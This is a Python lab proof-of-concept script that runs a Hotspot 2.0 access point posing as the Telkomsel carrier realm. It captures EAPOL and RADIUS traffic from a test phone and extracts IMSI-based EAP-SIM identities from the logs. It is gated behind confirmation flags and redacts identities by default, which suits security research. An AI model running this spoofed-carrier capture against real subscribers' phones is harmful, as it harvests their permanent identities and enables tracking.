#!/usr/bin/env python3
# flake8: noqa: E501
"""
Telkomsel HS2.0 / EAP-SIM Real-Phone PoC runner.

Purpose:
    Run a realistic lab hotspot for a real Android lab phone with a Telkomsel
    SIM, capture EAPOL/RADIUS evidence, and keep Docker victim simulation
    out of the default path.

Default mode is check-only and does not transmit.
"""

from __future__ import annotations

import argparse
import json
import platform
import re
import shlex
import subprocess
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path


POC_ROOT = Path(__file__).resolve().parent
COMPOSE_FILE = POC_ROOT / "docker-compose.yml"
HOSTAPD_CONF = POC_ROOT / "configs" / "hostapd.conf"
EVIDENCE_DIR = POC_ROOT / "evidence"
TELKOMSEL_REALM = "wlan.mnc010.mcc510.3gppnetwork.org"
TELKOMSEL_PLMN = "510,10"
TELKOMSEL_MCCMNC = "51010"


@dataclass
class CheckResult:
    name: str
    ok: bool
    detail: str


@dataclass
class IdentityFinding:
    kind: str
    value: str
    detail: str


@dataclass
class EapFinding:
    kind: str
    detail: str


@dataclass
class PocResult:
    mode: str
    started_at: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    checks: list[CheckResult] = field(default_factory=list)
    commands: list[str] = field(default_factory=list)
    evidence: list[str] = field(default_factory=list)
    identities: list[IdentityFinding] = field(default_factory=list)
    eap_findings: list[EapFinding] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)
    success: bool = False

    def add_check(self, name: str, ok: bool, detail: str) -> None:
        self.checks.append(CheckResult(name=name, ok=ok, detail=detail))

    def to_json(self) -> str:
        return json.dumps(asdict(self), indent=2, sort_keys=True)


def run_command(
    argv: list[str],
    *,
    timeout: int = 30,
    check: bool = False,
    cwd: Path = POC_ROOT,
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        argv,
        cwd=str(cwd),
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=timeout,
        check=check,
    )


def command_string(argv: list[str]) -> str:
    return " ".join(shlex.quote(part) for part in argv)


def read_hostapd_conf() -> dict[str, str]:
    values: dict[str, str] = {}
    if not HOSTAPD_CONF.exists():
        return values

    for raw_line in HOSTAPD_CONF.read_text(encoding="utf-8").splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, value = line.split("=", 1)
        key = key.strip()
        value = value.strip()
        if key in values:
            values[key] = f"{values[key]}\n{value}"
        else:
            values[key] = value
    return values


def mask_identity(value: str) -> str:
    if "@" in value:
        local, realm = value.split("@", 1)
        if len(local) <= 4:
            return f"{local}@{realm}"
        return f"{local[:3]}...{local[-2:]}@{realm}"
    if len(value) <= 6:
        return value
    return f"{value[:5]}...{value[-3:]}"


def detect_identities(text: str, *, redact: bool = True) -> list[IdentityFinding]:
    findings: list[IdentityFinding] = []
    seen: set[tuple[str, str]] = set()

    candidates = set(re.findall(r"(?<!\d)(?:1?51010\d{10})(?!\d)", text))
    candidates.update(re.findall(r"anonymous@[A-Za-z0-9_.-]+", text))
    candidates.update(re.findall(r"[A-Za-z0-9_.-]+@" + re.escape(TELKOMSEL_REALM), text))

    for candidate in sorted(candidates):
        kind = "unknown_identity"
        detail = "identity observed in AP/RADIUS logs"

        numeric = candidate.split("@", 1)[0]
        if candidate.startswith("anonymous@"):
            kind = "anonymous_identity"
            detail = "privacy-preserving outer identity; IMSI not exposed"
        elif numeric.isdigit() and len(numeric) == 16 and numeric.startswith("1"):
            imsi = numeric[1:]
            if imsi.startswith("51010"):
                kind = "permanent_eap_sim_identity"
                detail = "EAP-SIM permanent identity observed: value is '1' + IMSI"
        elif numeric.isdigit() and len(numeric) == 15 and numeric.startswith("51010"):
            kind = "imsi"
            detail = "raw IMSI-like value observed"
        elif "@" in candidate:
            kind = "pseudonym_or_realm_identity"
            detail = "realm identity observed; may be pseudonymized by device/carrier"

        value = mask_identity(candidate) if redact else candidate
        key = (kind, value)
        if key in seen:
            continue
        seen.add(key)
        findings.append(IdentityFinding(kind=kind, value=value, detail=detail))

    return findings


def detect_eap_findings(text: str) -> list[EapFinding]:
    patterns = {
        "access_request": r"Received Access-Request|Access-Request",
        "access_reject": r"Access-Reject|Sent Access-Reject",
        "access_accept": r"Access-Accept|Sent Access-Accept",
        "eap_identity": r"EAP-Identity|Identity reply|EAP Response.*Identity",
        "eap_sim": r"rlm_eap_sim|EAP-SIM|default_eap_type = \"sim\"",
        "eap_nak": r"EAP-NAK|Nak|NAK|No mutually acceptable",
        "radius_timeout": r"retransWhile --> 0|timeout|No response from RADIUS",
    }
    findings: list[EapFinding] = []
    for kind, pattern in patterns.items():
        if re.search(pattern, text, flags=re.IGNORECASE):
            findings.append(EapFinding(kind=kind, detail=f"matched /{pattern}/i"))
    return findings


def check_environment(interface: str) -> PocResult:
    result = PocResult(mode="check")
    conf = read_hostapd_conf()

    result.add_check("compose_file", COMPOSE_FILE.exists(), str(COMPOSE_FILE))
    result.add_check("hostapd_conf", HOSTAPD_CONF.exists(), str(HOSTAPD_CONF))
    result.add_check(
        "ssid",
        conf.get("ssid") == "LAB-HS20",
        f"configured={conf.get('ssid', '<missing>')}",
    )
    result.add_check(
        "telkomsel_plmn",
        conf.get("anqp_3gpp_cell_net") == TELKOMSEL_PLMN,
        f"configured={conf.get('anqp_3gpp_cell_net', '<missing>')}",
    )
    result.add_check(
        "telkomsel_realm",
        TELKOMSEL_REALM in conf.get("domain_name", "") and TELKOMSEL_REALM in conf.get("nai_realm", ""),
        f"domain={conf.get('domain_name', '<missing>')} nai_realm={conf.get('nai_realm', '<missing>')}",
    )
    result.add_check(
        "eap_sim_aka_advertised",
        all(marker in conf.get("nai_realm", "") for marker in ["18[5:6]", "23[5:7]", "50[5:7]"]),
        f"nai_realm={conf.get('nai_realm', '<missing>')}",
    )

    system = platform.system().lower()
    result.add_check("linux_host", system == "linux", f"platform={platform.system()}")
    if system != "linux":
        result.notes.append("AP mode with hostapd needs a Linux host or Linux VM with USB WiFi passthrough.")

    try:
        docker = run_command(["docker", "compose", "-f", str(COMPOSE_FILE), "config"], timeout=30)
        result.commands.append(command_string(["docker", "compose", "-f", str(COMPOSE_FILE), "config"]))
        result.add_check("docker_compose_config", docker.returncode == 0, docker.stdout.strip()[-500:])
    except Exception as exc:
        result.add_check("docker_compose_config", False, str(exc))

    try:
        iw_dev = run_command(["iw", "dev"], timeout=10)
        result.commands.append("iw dev")
        result.add_check("interface_visible", interface in iw_dev.stdout, f"interface={interface}")
    except Exception as exc:
        result.add_check("interface_visible", False, f"{exc}")

    try:
        iw_list = run_command(["iw", "list"], timeout=10)
        result.commands.append("iw list")
        result.add_check("adapter_ap_mode", "* AP" in iw_list.stdout or "\n\t\t * AP" in iw_list.stdout, "iw list contains AP mode")
    except Exception as exc:
        result.add_check("adapter_ap_mode", False, f"{exc}")

    result.success = all(check.ok for check in result.checks if check.name not in {"linux_host"})
    if not result.success:
        result.notes.append("Fix failed checks before using --mode start or --mode full.")
    return result


def require_confirmations(args: argparse.Namespace) -> None:
    if args.mode in {"start", "full", "sim-only-probe"}:
        if not args.confirm_real_phone_lab:
            raise SystemExit("--confirm-real-phone-lab is required for modes that start the AP.")
        if not args.confirm_rf_lab:
            raise SystemExit("--confirm-rf-lab is required before transmitting WiFi beacons.")


def start_hotspot(result: PocResult) -> None:
    argv = ["docker", "compose", "-f", str(COMPOSE_FILE), "up", "-d", "--build", "radius", "ap"]
    result.commands.append(command_string(argv))
    proc = run_command(argv, timeout=180)
    result.add_check("start_radius_ap", proc.returncode == 0, proc.stdout.strip()[-1000:])
    if proc.returncode != 0:
        raise RuntimeError(proc.stdout)
    result.notes.append("AP/RADIUS started. Use 'docker compose logs -f radius ap' to watch authentication attempts.")


def stop_hotspot(result: PocResult, *, down: bool = False) -> None:
    subcommand = "down" if down else "stop"
    services = [] if down else ["ap", "radius"]
    argv = ["docker", "compose", "-f", str(COMPOSE_FILE), subcommand, *services]
    result.commands.append(command_string(argv))
    proc = run_command(argv, timeout=60)
    result.add_check("stop_hotspot", proc.returncode == 0, proc.stdout.strip()[-1000:])
    if proc.returncode != 0:
        raise RuntimeError(proc.stdout)


def provision_android_metadata(result: PocResult) -> None:
    profile_path = POC_ROOT / "profiles" / "android_passpoint_telkomsel.json"
    payload = {
        "fqdn": TELKOMSEL_REALM,
        "friendly_name": "Telkomsel Lab",
        "realm": TELKOMSEL_REALM,
        "mccmnc": TELKOMSEL_MCCMNC,
        "eap_method": "SIM",
        "phase2_method": "NONE",
        "expected_ssid": "LAB-HS20",
        "install_paths": {
            "carrier_privileged_app": "silent-capable",
            "device_owner_mdm": "silent-capable on managed lab devices",
            "system_privileged_app": "silent-capable on custom/OEM lab builds",
        },
        "notes": [
            "The AP cannot force SIM credential selection.",
            "Silent EAP-SIM provisioning requires Android-side privileges.",
            "No user-interaction/no-root target means carrier-privileged, device-owner/MDM, or system-privileged only.",
            "Do not store real IMSI/Ki/OPc/authentication vectors here.",
        ],
    }
    profile_path.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    result.evidence.append(str(profile_path.relative_to(POC_ROOT)))
    result.notes.append("Generated Android Passpoint provisioning metadata.")


def capture_evidence(args: argparse.Namespace, result: PocResult) -> None:
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    wifi_pcap = EVIDENCE_DIR / f"telkomsel-wifi-{timestamp}.pcapng"
    eapol_pcap = EVIDENCE_DIR / f"telkomsel-eapol-{timestamp}.pcapng"
    radius_pcap = EVIDENCE_DIR / f"telkomsel-radius-{timestamp}.pcapng"
    docker_log = EVIDENCE_DIR / f"telkomsel-docker-logs-{timestamp}.log"
    note_path = EVIDENCE_DIR / f"telkomsel-run-{timestamp}.json"

    sudo_prefix = ["sudo"] if args.sudo else []
    captures = [
        (
            "wifi_ap_interface",
            [*sudo_prefix, "tcpdump", "-i", args.interface, "-w", str(wifi_pcap)],
            wifi_pcap,
        ),
        (
            "eapol",
            [*sudo_prefix, "tcpdump", "-i", args.interface, "-w", str(eapol_pcap), "ether", "proto", "0x888e"],
            eapol_pcap,
        ),
        (
            "radius",
            [*sudo_prefix, "tcpdump", "-i", args.radius_capture_interface, "-w", str(radius_pcap), "udp", "port", "1812", "or", "udp", "port", "1813"],
            radius_pcap,
        ),
    ]

    processes: list[tuple[str, subprocess.Popen[str], Path]] = []
    try:
        for name, argv, path in captures:
            result.commands.append(command_string(argv))
            proc = subprocess.Popen(
                argv,
                cwd=str(POC_ROOT),
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
            processes.append((name, proc, path))

        result.notes.append(f"Capturing for {args.capture_seconds}s. Connect the Telkomsel lab phone to/near LAB-HS20 now.")
        time.sleep(args.capture_seconds)
    finally:
        for name, proc, path in processes:
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait(timeout=5)

            output = ""
            if proc.stdout is not None:
                output = proc.stdout.read() or ""
            ok = path.exists() and path.stat().st_size > 0
            result.add_check(f"capture_{name}", ok, output.strip()[-500:] or str(path))
            if path.exists():
                result.evidence.append(str(path.relative_to(POC_ROOT)))

    logs_argv = [
        "docker",
        "compose",
        "-f",
        str(COMPOSE_FILE),
        "logs",
        "--no-color",
        "radius",
        "ap",
    ]
    result.commands.append(command_string(logs_argv))
    logs = run_command(logs_argv, timeout=30)
    docker_log.write_text(logs.stdout, encoding="utf-8")
    result.evidence.append(str(docker_log.relative_to(POC_ROOT)))
    result.add_check("capture_docker_logs", logs.returncode == 0, str(docker_log))

    result.identities.extend(
        detect_identities(logs.stdout, redact=not args.no_redact_identities)
    )
    result.eap_findings.extend(detect_eap_findings(logs.stdout))
    if result.identities:
        result.notes.append(
            "Identity material observed in logs. Raw pcaps/logs may contain the full value."
        )
    else:
        result.notes.append(
            "No Telkomsel IMSI/permanent identity found in AP/RADIUS logs; device may have used anonymous/pseudonym identity or did not attempt EAP-SIM."
        )
    if not any(f.kind == "access_request" for f in result.eap_findings):
        result.notes.append(
            "No RADIUS Access-Request observed; phone likely stopped at ANQP/scan or did not associate."
        )

    note_path.write_text(result.to_json() + "\n", encoding="utf-8")
    result.evidence.append(str(note_path.relative_to(POC_ROOT)))


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Run Telkomsel HS2.0/EAP-SIM real-phone lab PoC.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--mode",
        choices=[
            "check",
            "start",
            "capture",
            "full",
            "sim-only-probe",
            "stop",
            "provision-android",
        ],
        default="check",
        help="check is default and does not start the AP.",
    )
    parser.add_argument("--interface", default="wlan1", help="WiFi AP interface used by hostapd/tcpdump.")
    parser.add_argument("--radius-capture-interface", default="any", help="Interface for RADIUS tcpdump capture.")
    parser.add_argument("--capture-seconds", type=int, default=90, help="Evidence capture duration.")
    parser.add_argument("--sudo", action="store_true", help="Run tcpdump through sudo.")
    parser.add_argument("--down", action="store_true", help="Use docker compose down in stop mode.")
    parser.add_argument("--output", type=Path, default=None, help="Write JSON result to this file.")
    parser.add_argument("--confirm-real-phone-lab", action="store_true", help="Confirm the client is your lab phone/SIM.")
    parser.add_argument("--confirm-rf-lab", action="store_true", help="Confirm RF transmission is in your authorized lab setup.")
    parser.add_argument(
        "--no-redact-identities",
        action="store_true",
        help="Include full detected IMSI/EAP identities in JSON output. Raw logs/pcaps already contain unredacted evidence.",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    require_confirmations(args)

    result = check_environment(args.interface)
    result.mode = args.mode

    try:
        if args.mode == "start":
            start_hotspot(result)
        elif args.mode == "capture":
            capture_evidence(args, result)
        elif args.mode == "full":
            start_hotspot(result)
            capture_evidence(args, result)
        elif args.mode == "sim-only-probe":
            result.notes.append(
                "SIM-only probe: RADIUS is configured without PEAP/TTLS fallback."
            )
            start_hotspot(result)
            capture_evidence(args, result)
        elif args.mode == "stop":
            stop_hotspot(result, down=args.down)
        elif args.mode == "provision-android":
            provision_android_metadata(result)

        result.success = all(check.ok for check in result.checks)
    except Exception as exc:
        result.success = False
        result.notes.append(f"error: {exc}")

    output = result.to_json()
    print(output)

    if args.output is not None:
        args.output.parent.mkdir(parents=True, exist_ok=True)
        args.output.write_text(output + "\n", encoding="utf-8")

    return 0 if result.success else 1


if __name__ == "__main__":
    raise SystemExit(main())
